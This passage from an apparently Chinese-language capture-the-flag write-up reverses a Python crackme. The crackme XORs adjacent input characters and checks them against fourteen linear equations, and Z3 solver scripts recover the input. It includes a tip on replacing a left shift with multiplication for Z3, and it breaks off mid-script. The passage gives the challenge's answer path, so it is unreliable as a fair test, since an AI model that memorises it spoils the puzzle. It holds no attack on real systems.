class="hljs-attribute">input1</span> = input(&#x27;input something:&#x27;)<br><span class="hljs-attribute">if</span> len(input1) != <span class="hljs-number">14</span>:<br>    <span class="hljs-attribute">print</span>(&#x27;Wrong length!&#x27;)<br>    <span class="hljs-attribute">sys</span>.exit()<br><span class="hljs-attribute">code</span> =<span class="hljs-meta"> []</span><br><span class="hljs-attribute">for</span> i in range(<span class="hljs-number">13</span>):<br>    <span class="hljs-attribute">code</span>.append(ord(input1[i]) ^ ord(input1[i + <span class="hljs-number">1</span>]))<br><br><span class="hljs-attribute">code</span>.append(ord(input1[<span class="hljs-number">13</span>]))<br><span class="hljs-attribute">a1</span> = code[<span class="hljs-number">2</span>]<br><span class="hljs-attribute">a2</span> = code[<span class="hljs-number">1</span>]<br><span class="hljs-attribute">a3</span> = code[<span class="hljs-number">0</span>]<br><span class="hljs-attribute">a4</span> = code[<span class="hljs-number">3</span>]<br><span class="hljs-attribute">a5</span> = code[<span class="hljs-number">4</span>]<br><span class="hljs-attribute">a6</span> = code[<span class="hljs-number">5</span>]<br><span class="hljs-attribute">a7</span> = code[<span class="hljs-number">6</span>]<br><span class="hljs-attribute">a8</span> = code[<span class="hljs-number">7</span>]<br><span class="hljs-attribute">a9</span> = code[<span class="hljs-number">9</span>]<br><span class="hljs-attribute">a10</span> = code[<span class="hljs-number">8</span>]<br><span class="hljs-attribute">a11</span> = code[<span class="hljs-number">10</span>]<br><span class="hljs-attribute">a12</span> = code[<span class="hljs-number">11</span>]<br><span class="hljs-attribute">a13</span> = code[<span class="hljs-number">12</span>]<br><span class="hljs-attribute">a14</span> = code[<span class="hljs-number">13</span>]<br><span class="hljs-attribute">if</span> ((((a1 * <span class="hljs-number">88</span> + a2 * <span class="hljs-number">67</span> + a3 * <span class="hljs-number">65</span> - a4 * <span class="hljs-number">5</span>) + a5 * <span class="hljs-number">43</span> + a6 * <span class="hljs-number">89</span> + a7 * <span class="hljs-number">25</span> + a8 * <span class="hljs-number">13</span> - a9 * <span class="hljs-number">36</span>) + a10 * <span class="hljs-number">15</span> + a11 * <span class="hljs-number">11</span> + a12 * <span class="hljs-number">47</span> - a13 * <span class="hljs-number">60</span>) + a14 * <span class="hljs-number">29</span> == <span class="hljs-number">22748</span>) &amp; ((((a1 * <span class="hljs-number">89</span> + a2 * <span class="hljs-number">7</span> + a3 * <span class="hljs-number">12</span> - a4 * <span class="hljs-number">25</span>) + a5 * <span class="hljs-number">41</span> + a6 * <span class="hljs-number">23</span> + a7 * <span class="hljs-number">20</span> - a8 * <span class="hljs-number">66</span>) + a9 * <span class="hljs-number">31</span> + a10 * <span class="hljs-number">8</span> + a11 * <span class="hljs-number">2</span> - a12 * <span class="hljs-number">41</span> - a13 * <span class="hljs-number">39</span>) + a14 * <span class="hljs-number">17</span> == <span class="hljs-number">7258</span>) &amp; ((((a1 * <span class="hljs-number">28</span> + a2 * <span class="hljs-number">35</span> + a3 * <span class="hljs-number">16</span> - a4 * <span class="hljs-number">65</span>) + a5 * <span class="hljs-number">53</span> + a6 * <span class="hljs-number">39</span> + a7 * <span class="hljs-number">27</span> + a8 * <span class="hljs-number">15</span> - a9 * <span class="hljs-number">33</span>) + a10 * <span class="hljs-number">13</span> + a11 * <span class="hljs-number">101</span> + a12 * <span class="hljs-number">90</span> - a13 * <span class="hljs-number">34</span>) + a14 * <span class="hljs-number">23</span> == <span class="hljs-number">26190</span>) &amp; ((((a1 * <span class="hljs-number">23</span> + a2 * <span class="hljs-number">34</span> + a3 * <span class="hljs-number">35</span> - a4 * <span class="hljs-number">59</span>) + a5 * <span class="hljs-number">49</span> + a6 * <span class="hljs-number">81</span> + a7 * <span class="hljs-number">25</span> + (a8 &lt;&lt; <span class="hljs-number">7</span>) - a9 * <span class="hljs-number">32</span>) + a10 * <span class="hljs-number">75</span> + a11 * <span class="hljs-number">81</span> + a12 * <span class="hljs-number">47</span> - a13 * <span class="hljs-number">60</span>) + a14 * <span class="hljs-number">29</span> == <span class="hljs-number">37136</span>) &amp; (((a1 * <span class="hljs-number">38</span> + a2 * <span class="hljs-number">97</span> + a3 * <span class="hljs-number">35</span> - a4 * <span class="hljs-number">52</span>) + a5 * <span class="hljs-number">42</span> + a6 * <span class="hljs-number">79</span> + a7 * <span class="hljs-number">90</span> + a8 * <span class="hljs-number">23</span> - a9 * <span class="hljs-number">36</span>) + a10 * <span class="hljs-number">57</span> + a11 * <span class="hljs-number">81</span> + a12 * <span class="hljs-number">42</span> - a13 * <span class="hljs-number">62</span> - a14 * <span class="hljs-number">11</span> == <span class="hljs-number">27915</span>) &amp; ((((a1 * <span class="hljs-number">22</span> + a2 * <span class="hljs-number">27</span> + a3 * <span class="hljs-number">35</span> - a4 * <span class="hljs-number">45</span>) + a5 * <span class="hljs-number">47</span> + a6 * <span class="hljs-number">49</span> + a7 * <span class="hljs-number">29</span> + a8 * <span class="hljs-number">18</span> - a9 * <span class="hljs-number">26</span>) + a10 * <span class="hljs-number">35</span> + a11 * <span class="hljs-number">41</span> + a12 * <span class="hljs-number">40</span> - a13 * <span class="hljs-number">61</span>) + a14 * <span class="hljs-number">28</span> == <span class="hljs-number">17298</span>) &amp; ((((a1 * <span class="hljs-number">12</span> + a2 * <span class="hljs-number">45</span> + a3 * <span class="hljs-number">35</span> - a4 * <span class="hljs-number">9</span> - a5 * <span class="hljs-number">42</span>) + a6 * <span class="hljs-number">86</span> + a7 * <span class="hljs-number">23</span> + a8 * <span class="hljs-number">85</span> - a9 * <span class="hljs-number">47</span>) + a10 * <span class="hljs-number">34</span> + a11 * <span class="hljs-number">76</span> + a12 * <span class="hljs-number">43</span> - a13 * <span class="hljs-number">44</span>) + a14 * <span class="hljs-number">65</span> == <span class="hljs-number">19875</span>) &amp; (((a1 * <span class="hljs-number">79</span> + a2 * <span class="hljs-number">62</span> + a3 * <span class="hljs-number">35</span> - a4 * <span class="hljs-number">85</span>) + a5 * <span class="hljs-number">33</span> + a6 * <span class="hljs-number">79</span> + a7 * <span class="hljs-number">86</span> + a8 * <span class="hljs-number">14</span> - a9 * <span class="hljs-number">30</span>) + a10 * <span class="hljs-number">25</span> + a11 * <span class="hljs-number">11</span> + a12 * <span class="hljs-number">57</span> - a13 * <span class="hljs-number">50</span> - a14 * <span class="hljs-number">9</span> == <span class="hljs-number">22784</span>) &amp; ((((a1 * <span class="hljs-number">8</span> + a2 * <span class="hljs-number">6</span> + a3 * <span class="hljs-number">64</span> - a4 * <span class="hljs-number">85</span>) + a5 * <span class="hljs-number">73</span> + a6 * <span class="hljs-number">29</span> + a7 * <span class="hljs-number">2</span> + a8 * <span class="hljs-number">23</span> - a9 * <span class="hljs-number">36</span>) + a10 * <span class="hljs-number">5</span> + a11 * <span class="hljs-number">2</span> + a12 * <span class="hljs-number">47</span> - a13 * <span class="hljs-number">64</span>) + a14 * <span class="hljs-number">27</span> == <span class="hljs-number">9710</span>) &amp; (((((a1 * <span class="hljs-number">67</span> - a2 * <span class="hljs-number">68</span>) + a3 * <span class="hljs-number">68</span> - a4 * <span class="hljs-number">51</span> - a5 * <span class="hljs-number">43</span>) + a6 * <span class="hljs-number">81</span> + a7 * <span class="hljs-number">22</span> - a8 * <span class="hljs-number">12</span> - a9 * <span class="hljs-number">38</span>) + a10 * <span class="hljs-number">75</span> + a11 * <span class="hljs-number">41</span> + a12 * <span class="hljs-number">27</span> - a13 * <span class="hljs-number">52</span>) + a14 * <span class="hljs-number">31</span> == <span class="hljs-number">13376</span>) &amp; ((((a1 * <span class="hljs-number">85</span> + a2 * <span class="hljs-number">63</span> + a3 * <span class="hljs-number">5</span> - a4 * <span class="hljs-number">51</span>) + a5 * <span class="hljs-number">44</span> + a6 * <span class="hljs-number">36</span> + a7 * <span class="hljs-number">28</span> + a8 * <span class="hljs-number">15</span> - a9 * <span class="hljs-number">6</span>) + a10 * <span class="hljs-number">45</span> + a11 * <span class="hljs-number">31</span> + a12 * <span class="hljs-number">7</span> - a13 * <span class="hljs-number">67</span>) + a14 * <span class="hljs-number">78</span> == <span class="hljs-number">24065</span>) &amp; ((((a1 * <span class="hljs-number">47</span> + a2 * <span class="hljs-number">64</span> + a3 * <span class="hljs-number">66</span> - a4 * <span class="hljs-number">5</span>) + a5 * <span class="hljs-number">43</span> + a6 * <span class="hljs-number">112</span> + a7 * <span class="hljs-number">25</span> + a8 * <span class="hljs-number">13</span> - a9 * <span class="hljs-number">35</span>) + a10 * <span class="hljs-number">95</span> + a11 * <span class="hljs-number">21</span> + a12 * <span class="hljs-number">43</span> - a13 * <span class="hljs-number">61</span>) + a14 * <span class="hljs-number">20</span> == <span class="hljs-number">27687</span>) &amp; (((a1 * <span class="hljs-number">89</span> + a2 * <span class="hljs-number">67</span> + a3 * <span class="hljs-number">85</span> - a4 * <span class="hljs-number">25</span>) + a5 * <span class="hljs-number">49</span> + a6 * <span class="hljs-number">89</span> + a7 * <span class="hljs-number">23</span> + a8 * <span class="hljs-number">56</span> - a9 * <span class="hljs-number">92</span>) + a10 * <span class="hljs-number">14</span> + a11 * <span class="hljs-number">89</span> + a12 * <span class="hljs-number">47</span> - a13 * <span class="hljs-number">61</span> - a14 * <span class="hljs-number">29</span> == <span class="hljs-number">29250</span>) &amp; (((a1 * <span class="hljs-number">95</span> + a2 * <span class="hljs-number">34</span> + a3 * <span class="hljs-number">62</span> - a4 * <span class="hljs-number">9</span> - a5 * <span class="hljs-number">43</span>) + a6 * <span class="hljs-number">83</span> + a7 * <span class="hljs-number">25</span> + a8 * <span class="hljs-number">12</span> - a9 * <span class="hljs-number">36</span>) + a10 * <span class="hljs-number">16</span> + a11 * <span class="hljs-number">51</span> + a12 * <span class="hljs-number">47</span> - a13 * <span class="hljs-number">60</span> - a14 * <span class="hljs-number">24</span> == <span class="hljs-number">15317</span>):<br>    <span class="hljs-attribute">print</span>(&#x27;flag is GWHT&#123;md5(your_input)&#125;&#x27;)<br>    <span class="hljs-attribute">print</span>(&#x27;Congratulations and have fun!&#x27;)<br><span class="hljs-attribute">else</span>:<br>    <span class="hljs-attribute">print</span>(&#x27;Sorry,plz try again...&#x27;)<br></code></pre></td></tr></table></figure><h3 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h3><p>这里的(a8 &lt;&lt; 7)要改成(a8 * 0x80)，不然会报错</p><p>在Python中，使用左移操作符 <code>&lt;&lt;</code> 可以将数值按位左移。然而，在Z3中，左移操作符 <code>&lt;&lt;</code> 是不支持的。因此，需要将左移操作转换为等效的乘法操作。</p><p>左移7位相当于乘以 2的7次，也就是128。因此，<code>a8 &lt;&lt; 7</code> 等价于 <code>a8 * 128</code> 或 <code>a8 * 0x80</code></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1721791003971-2f81c425-cc6d-4e8b-b0ee-7b1813dccafc.png"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">from</span> z3 import *<br><br><span class="hljs-attribute">a1</span> = Int(&#x27;a2&#x27;)<br><span class="hljs-attribute">a2</span> = Int(&#x27;a1&#x27;)<br><span class="hljs-attribute">a3</span> = Int(&#x27;a0&#x27;)<br><span class="hljs-attribute">a4</span> = Int(&#x27;a3&#x27;)<br><span class="hljs-attribute">a5</span> = Int(&#x27;a4&#x27;)<br><span class="hljs-attribute">a6</span> = Int(&#x27;a5&#x27;)<br><span class="hljs-attribute">a7</span> = Int(&#x27;a6&#x27;)<br><span class="hljs-attribute">a8</span> = Int(&#x27;a7&#x27;)<br><span class="hljs-attribute">a9</span> = Int(&#x27;a9&#x27;)<br><span class="hljs-attribute">a10</span> = Int(&#x27;a8&#x27;)<br><span class="hljs-attribute">a11</span> = Int(&#x27;a10&#x27;)<br><span class="hljs-attribute">a12</span> = Int(&#x27;a11&#x27;)<br><span class="hljs-attribute">a13</span> = Int(&#x27;a12&#x27;)<br><span class="hljs-attribute">a14</span> = Int(&#x27;a13&#x27;)<br><br><span class="hljs-attribute">s</span> = Solver()<br><br><span class="hljs-attribute">s</span>.add(a1 * <span class="hljs-number">88</span> + a2 * <span class="hljs-number">67</span> + a3 * <span class="hljs-number">65</span> - a4 * <span class="hljs-number">5</span> + a5 * <span class="hljs-number">43</span> + a6 * <span class="hljs-number">89</span> + a7 * <span class="hljs-number">25</span> + a8 * <span class="hljs-number">13</span> - a9 * <span class="hljs-number">36</span> + a10 * <span class="hljs-number">15</span> + a11 * <span class="hljs-number">11</span> + a12 * <span class="hljs-number">47</span> - a13 * <span class="hljs-number">60</span> + a14 * <span class="hljs-number">29</span> == <span class="hljs-number">22748</span>)<br><span class="hljs-attribute">s</span>.add(a1 * <span class="hljs-number">89</span> + a2 * <span class="hljs-number">7</span> + a3 * <span class="hljs-number">12</span> - a4 * <span class="hljs-number">25</span> + a5 * <span class="hljs-number">41</span> + a6 * <span class="hljs-number">23</span> + a7 * <span class="hljs-number">20</span> - a8 * <span class="hljs-number">66</span> + a9 * <span class="hljs-number">31</span> + a10 * <span class="hljs-number">8</span> + a11 * <span class="hljs-number">2</span> - a12 * <span class="hljs-number">41</span> - a13 * <span class="hljs-number">39</span> + a14 * <span class="hljs-number">17</span> == <span class="hljs-number">7258</span>)<br><span class="hljs-attribute">s</span>.add(a1 * <span class="hljs-number">28</span> + a2 * <span class="hljs-number">35</span> + a3 * <span class="hljs-number">16</span> - a4 * <span class="hljs-number">65</span> + a5 * <span class="hljs-number">53</span> + a6 * <span class="hljs-number">39</span> + a7 * <span class="hljs-number">27</span> + a8 * <span class="hljs-number">15</span> - a9 * <span class="hljs-number">33</span> + a10 * <span class="hljs-number">13</span> + a11 * <span class="hljs-number">101</span> + a12 * <span class="hljs-number">90</span> - a13 * <span class="hljs-number">34</span> + a14 * <span class="hljs-number">23</span> == <span class="hljs-number">26190</span>)<br><span class="hljs-attribute">s</span>.add(a1 * <span class="hljs-number">23</span> + a2 * <span class="hljs-number">34</span> + a3 * <span class="hljs-number">35</span> - a4 * <span class="hljs-number">59</span> + a5 * <span class="hljs-number">49</span> + a6 * <span class="hljs-number">81</span> + a7 * <span class="hljs-number">25</span> + (a8 * <span class="hljs-number">0</span>x80) - a9 * <span class="hljs-number">32</span> + a10 * <span class="hljs-number">75</span> + a11 * <span class="hljs-number">81</span> + a12 * <span class="hljs-number">47</span> - a13 * <span class="hljs-number">60</span> + a14 * <span class="hljs-number">29</span> == <span class="hljs-number">37136</span>)<br><span class="hljs-attribute">s</span>.add(a1 * <span class="hljs-number">38</span> + a2 * <span class="hljs-number">97</span> + a3 * <span class="hljs-number">35</span> - a4 * <span class="hljs-number">52</span> + a5 * <span class="hljs-number">42</span> + a6 * <span class="hljs-number">79</span> + a7 * <span class="hljs-number">90</span> + a8 * <span class="hljs-number">23</span> - a9 * <span class="hljs-number">36</span> + a10 * <span class="hljs-number">57</span> + a11 * <span class="hljs-number">81</span> + a12 * <span class="hljs-number">42</span> - a13 * <span class="hljs-number">62</span> - a14 * <span class="hljs-number">11</span> == <span class="hljs-number">27915</span>)<br><span class="hljs-attribute">s</span>.add(a1 * <span class="hljs-number">22</span> + a2 * <span class="hljs-number">27</span> + a3 * <span class="hljs-number">35</span> - a4 * <span class="hljs-number">45</span> + a5 * <span class="hljs-number">47</span> + a6 * <span class="hljs-number">49</span> + a7 * <span class="hljs-number">29</span> + a8 * <span class="hljs-number">18</span> - a9 * <span class="hljs-number">26</span> + a10 * <span class="hljs-number">35</span> + a11 * <span class="hljs-number">41</span> + a12 * <span class="hljs-number">40</span> - a13 * <span class="hljs-number">61</span> + a14 * <span class="hljs-number">28</span> == <span class="hljs-number">17298</span>)<br><span class="hljs-attribute">s</span>.add(a1 * <span class="hljs-number">12</span> + a2 * <span class="hljs-number">45</span> + a3 * <span class="hljs-number">35</span> - a4 * <span class="hljs-number">9</span> - a5 * <span class="hljs-number">42</span> + a6 * <span class="hljs-number">86</span> + a7 * <span class="hljs-number">23</span> + a8 * <span class="hljs-number">85</span> - a9 * <span class="hljs-number">47</span> + a10 * <span class="hljs-number">34</span> + a11 * <span class="hljs-number">76</span> + a12 * <span class="hljs-number">43</span> - a13 * <span class="hljs-number">44</span> + a14 * <span class="hljs-number">65</span> == <span class="hljs-number">19875</span>)<br><span class="hljs-attribute">s</span>.add(a1 * <span class="hljs-number">79</span> + a2 * <span class="hljs-number">62</span> + a3 * <span class="hljs-number">35</span> - a4 * <span class="hljs-number">85</span> + a5 * <span class="hljs-number">33</span> + a6 * <span class="hljs-number">79</span> + a7 * <span class="hljs-number">86</span> + a8 * <span class="hljs-number">14</span> - a9 * <span class="hljs-number">30</span> + a10 * <span class="hljs-number">25</span> + a11 * <span class="hljs-number">11</span> + a12 * <span class="hljs-number">57</span> - a13 * <span class="hljs-number">50</span> - a14 * <span class="hljs-number">9</span> == <span class="hljs-number">22784</span>)<br><span class="hljs-attribute">s</span>.add(a1 * <span class="hljs-number">8</span> + a2 * <span class="hljs-number">6</span> + a3 * <span class="hljs-number">64</span> - a4 * <span class="hljs-number">85</span> + a5 * <span class="hljs-number">73</span> + a6 * <span class="hljs-number">29</span> + a7 * <span class="hljs-number">2</span> + a8 * <span class="hljs-number">23</span> - a9 * <span class="hljs-number">36</span> + a10 * <span class="hljs-number">5</span> + a11 * <span class="hljs-number">2</span> + a12 * <span class="hljs-number">47</span> - a13 * <span class="hljs-number">64</span> + a14 * <span class="hljs-number">27</span> == <span class="hljs-number">9710</span>)<br><span class="hljs-attribute">s</span>.add(a1 * <span class="hljs-number">67</span> - a2 * <span class="hljs-number">68</span> + a3 * <span class="hljs-number">68</span> - a4 * <span class="hljs-number">51</span> - a5 * <span class="hljs-number">43</span> + a6 * <span class="hljs-number">81</span> + a7 * <span class="hljs-number">22</span> - a8 * <span class="hljs-number">12</span> - a9 * <span class="hljs-number">38</span> + a10 * <span class="hljs-number">75</span> + a11 * <span class="hljs-number">41</span> + a12 * <span class="hljs-number">27</span> - a13 * <span class="hljs-number">52</span> + a14 * <span class="hljs-number">31</span> == <span class="hljs-number">13376</span>)<br><span class="hljs-attribute">s</span>.add(a1 * <span class="hljs-number">85</span> + a2 * <span class="hljs-number">63</span> + a3 * <span class="hljs-number">5</span> - a4 * <span class="hljs-number">51</span> + a5 * <span class="hljs-number">44</span> + a6 * <span class="hljs-number">36</span> + a7 * <span class="hljs-number">28</span> + a8 * <span class="hljs-number">15</span> - a9 * <span class="hljs-number">6</span> + a10 * <span class="hljs-number">45</span> + a11 * <span class="hljs-number">31</span> + a12 * <span class="hljs-number">7</span> - a13 * <span class="hljs-number">67</span> + a14 * <span class="hljs-number">78</span> == <span class="hljs-number">24065</span>)<br><span class="hljs-attribute">s</span>.add(a1 * <span class="hljs-number">47</span> + a2 * <span class="hljs-number">64</span> + a3 * <span class="hljs-number">66</span> - a4 * <span class="hljs-number">5</span> + a5 * <span class="hljs-number">43</span> + a6 * <span class="hljs-number">112</span> + a7 * <span class="hljs-number">25</span> + a8 * <span class="hljs-number">13</span> - a9 * <span class="hljs-number">35</span> + a10 * <span class="hljs-number">95</span> + a11 * <span class="hljs-number">21</span> + a12 * <span class="hljs-number">43</span> - a13 * <span class="hljs-number">61</span> + a14 * <span class="hljs-number">20</span> == <span class="hljs-number">27687</span>)<br><span class="hljs-attribute">s</span>.add(a1 * <span class="hljs-number">89</span> + a2 * <span class="hljs-number">67</span> + a3 * <span class="hljs-number">85</span> - a4 * <span class="hljs-number">25</span> + a5 * <span class="hljs-number">49</span> + a6 * <span class="hljs-number">89</span> + a7 * <span class="hljs-number">23</span> + a8 * <span class="hljs-number">56</span> - a9 * <span class="hljs-number">92</span> + a10 * <span class="hljs-number">14</span> + a11 * <span class="hljs-number">89</span> + a12 * <span class="hljs-number">47</span> - a13 * <span class="hljs-number">61</span> - a14 * <span class="hljs-number">29</span> == <span class="hljs-number">29250</span>)<br><span class="hljs-attribute">s</span>.add(a1 * <span class="hljs-number">95</span> + a2 * <span class="hljs-number">34</span> + a3 * <span class="hljs-number">62</span> - a4 * <span class="hljs-number">9</span> - a5 * <span class="hljs-number">43</span> + a6 * <span class="hljs-number">83</span> + a7 * <span class="hljs-number">25</span> + a8 * <span class="hljs-number">12</span> - a9 * <span class="hljs-number">36</span> + a10 * <span class="hljs-number">16</span> + a11 * <span class="hljs-number">51</span> + a12 * <span class="hljs-number">47</span> - a13 * <span class="hljs-number">60</span> - a14 * <span class="hljs-number">24</span> == <span class="hljs-number">15317</span>)<br><br><span class="hljs-attribute">if</span> &#x27;un&#x27; not in str(s.check()):<br>    <span class="hljs-attribute">print</span>(s.model())<br></code></pre></td></tr></table></figure><p>根据输出创建字典</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1721791302249-cb278161-cf5d-4c14-a1bf-4cc96250a6d6.png"></p><h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs tap">from z3 import *<br><br>a1 = Int(&#x27;a2&#x27;)<br>a2 = Int(&#x27;a1&#x27;)<br>a3 = Int(&#x27;a0&#x27;)<br>a4 = Int(&#x27;a3&#x27;)<br>a5 = Int(&#x27;a4&#x27;)<br>a6 = Int(&#x27;a5&#x27;)<br>a7 = Int(&#x27;a6&#x27;)<br>a8 = Int(&#x27;a7&#x27;)<br>a9 = Int(&#x27;a9&#x27;)<br>a10 = Int(&#x27;a8&#x27;)<br>a11 = Int(&#x27;a10&#x27;)<br>a12 = Int(&#x27;a11&#x27;)<br>a13 = Int(&#x27;a12&#x27;)<br>a14 = Int(&#x27;a13&#x27;)<br><br>s = Solver()<br><br>s.add(a1 *<span class="hljs-number"> 88 </span>+ a2 *<span class="hljs-number"> 67 </span>+ a3 *<span class="hljs-number"> 65 </span>- a4 *<span class="hljs-number"> 5 </span>+ a5 *<span class="hljs-number"> 43 </span>+ a6 *<span class="hljs-number"> 89 </span>+ a7 *<span class="hljs-number"> 25 </span>+ a8 *<span class="hljs-number"> 13 </span>- a9 *<span class="hljs-number"> 36 </span>+ a10 *<span class="hljs-number"> 15 </span>+ a11 *<span class="hljs-number"> 11 </span>+ a12 *<span class="hljs-number"> 47 </span>- a13 *<span class="hljs-number"> 60 </span>+ a14 *<span class="hljs-number"> 29 </span>== 22748)<br>s.add(a1 *<span class="hljs-number"> 89 </span>+ a2 *<span class="hljs-number"> 7 </span>+ a3 *<span class="hljs-number"> 12 </span>- a4 *<span class="hljs-number"> 25 </span>+ a5 *<span class="hljs-number"> 41 </span>+ a6 *<span class="hljs-number"> 23 </span>+ a7 *<span class="hljs-number"> 20 </span>- a8 *<span class="hljs-number"> 66 </span>+ a9 *<span class="hljs-number"> 31 </span>+ a10 *<span class="hljs-number"> 8 </span>+ a11 *<span class="hljs-number"> 2 </span>- a12 *<span class="hljs-number"> 41 </span>- a13 *<span class="hljs-number"> 39 </span>+ a14 *<span class="hljs-number"> 17 </span>== 7258)<br>s.add(a1 *<span class="hljs-number"> 28 </span>+ a2 *<span class="hljs-number"> 35 </span>+ a3 *<span class="hljs-number"> 16 </span>- a4 *<span class="hljs-number"> 65 </span>+ a5 *<span class="hljs-number"> 53 </span>+ a6 *<span class="hljs-number"> 39 </span>+ a7 *<span class="hljs-number"> 27 </span>+ a8 *<span class="hljs-number"> 15 </span>- a9 *<span class="hljs-number"> 33 </span>+ a10 *<span class="hljs-number"> 13 </span>+ a11 *<span class="hljs-number"> 101 </span>+ a12 *<span class="hljs-number"> 90 </span>- a13 *<span class="hljs-number"> 34 </span>+ a14 *<span class="hljs-number"> 23 </span>== 26190)<br>s.add(a1 *<span class="hljs-number"> 23 </span>+ a2 *<span class="hljs-number"> 34 </span>+ a3 *<span class="hljs-number"> 35 </span>- a4 *<span class="hljs-number"> 59 </span>+ a5 *<span class="hljs-number"> 49 </span>+ a6 *<span class="hljs-number"> 81 </span>+ a7 *<span class="hljs-number"> 25 </span>+ (a8 * 0x80) - a9 *<span class="hljs-number"> 32 </span>+ a10 *<span class="hljs-number"> 75 </span>+ a11 *<span class="hljs-number"> 81 </span>+ a12 *<span class="hljs-number"> 47 </span>- a13 *<span class="hljs-number"> 60 </span>+ a14 *<span class="hljs-number"> 29 </span>== 37136)<br>s.add(a1 *<span class="hljs-number"> 38 </span>+ a2 *<span class="hljs-number"> 97 </span>+ a3 *<span class="hljs-number"> 35 </span>- a4 *<span class="hljs-number"> 52 </span>+ a5 *<span class="hljs-number"> 42 </span>+ a6 *<span class="hljs-number"> 79 </span>+ a7 *<span class="hljs-number"> 90 </span>+ a8 *<span class="hljs-number"> 23 </span>- a9 *<span class="hljs-number"> 36 </span>+ a10 *<span class="hljs-number"> 57 </span>+ a11 *<span class="hljs-number"> 81 </span>+ a12 *<span class="hljs-number"> 42 </span>- a13 *<span class="hljs-number"> 62 </span>- a14 *<span class="hljs-number"> 11 </span>== 27915)<br>s.add(a1 *<span class="hljs-number"> 22 </span>+ a2 *<span class="hljs-number"> 27 </span>+ a3 *<span class="hljs-number"> 35 </span>- a4 *<span class="hljs-number"> 45 </span>+ a5 *<span class="hljs-number"> 47 </span>+ a6 *<span class="hljs-number"> 49 </span>+ a7 *<span class="hljs-number"> 29 </span>+ a8 *<span class="hljs-number"> 18 </span>- a9 *<span class="hljs-number"> 26 </span>+ a10 *<span class="hljs-number"> 35 </span>+ a11 *<span class="hljs-number"> 41 </span>+ a12 *<span class="hljs-number"> 40 </span>- a13 *<span class="hljs-number"> 61 </span>+ a14 *<span class="hljs-number"> 28 </span>== 17298)<br>s.add(a1 *<span class="hljs-number"> 12 </span>+ a2 *<span class="hljs-number"> 45 </span>+ a3 *<span class="hljs-number"> 35 </span>- a4 *<span class="hljs-number"> 9 </span>- a5 *<span class="hljs-number"> 42 </span>+ a6 *<span class="hljs-number"> 86 </span>+ a7 *<span class="hljs-number"> 23 </span>+ a8 *<span class="hljs-number"> 85 </span>- a9 *<span class="hljs-number"> 47 </span>+ a10 *<span class="hljs-number"> 34 </span>+ a11 *<span class="hljs-number"> 76 </span>+ a12 *<span class="hljs-number"> 43 </span>- a13 *<span class="hljs-number"> 44 </span>+ a14 *<span class="hljs-number"> 65 </span>== 19875)<br>s.add(a1 *<span class="hljs-number"> 79 </span>+ a2 *<span class="hljs-number"> 62 </span>+ a3 *<span class="hljs-number"> 35 </span>- a4 *<span class="hljs-number"> 85 </span>+ a5 *<span class="hljs-number"> 33 </span>+ a6 *<span class="hljs-number"> 79 </span>+ a7 *<span class="hljs-number"> 86 </span>+ a8 *<span class="hljs-number"> 14 </span>- a9 *<span class="hljs-number"> 30 </span>+ a10 *<span class="hljs-number"> 25 </span>+ a11 *<span class="hljs-number"> 11 </span>+ a12 *<span class="hljs-number"> 57 </span>- a13 *<span class="hljs-number"> 50 </span>- a14 *<span class="hljs-number"> 9 </span>== 22784)<br>s.add(a1 *<span class="hljs-number"> 8 </span>+ a2 *<span class="hljs-number"> 6 </span>+ a3 *<span class="hljs-number"> 64 </span>- a4 *<span class="hljs-number"> 85 </span>+ a5 *<span class="hljs-number"> 73 </span>+ a6 *<span class="hljs-number"> 29 </span>+ a7 *<span class="hljs-number"> 2 </span>+ a8 *<span class="hljs-number"> 23 </span>- a9 *<span class="hljs-number"> 36 </span>+ a10 *<span class="hljs-number"> 5 </span>+ a11 *<span class="hljs-number"> 2 </span>+ a12 *<span class="hljs-number"> 47 </span>- a13 *<span class="hljs-number"> 64 </span>+ a14 *<span class="hljs-number"> 27 </span>== 9710)<br>s.add(a1 *<span class="hljs-number"> 67 </span>- a2 *<span class="hljs-number"> 68 </span>+ a3 *<span class="hljs-number"> 68 </span>- a4 *<span 